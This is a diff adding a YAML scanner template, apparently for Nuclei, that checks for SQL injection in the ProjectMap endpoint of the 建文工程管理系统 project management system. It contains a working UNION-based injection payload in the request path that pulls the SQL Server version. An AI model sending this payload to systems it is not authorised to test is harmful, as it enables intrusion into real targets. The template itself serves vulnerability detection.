@@ -1,0 +1,28 @@
+id: poc-yaml-justwin-projectmap-sqli
+info:
+  name: 建文工程管理系统 ProjectMap SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in 建文工程管理系统 ProjectMap endpoint.
+http:
+  - method: GET
+    path:
+      - "/api/api/APM/KPI/PMDashBoard/ProjectMap/1')%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,@@VERSION--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"StatusCode\":200"
+          - "Microsoft SQL Server"
+          - "\"IsSuccess\":true"
+          - "\"Message\":\"OK\""
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
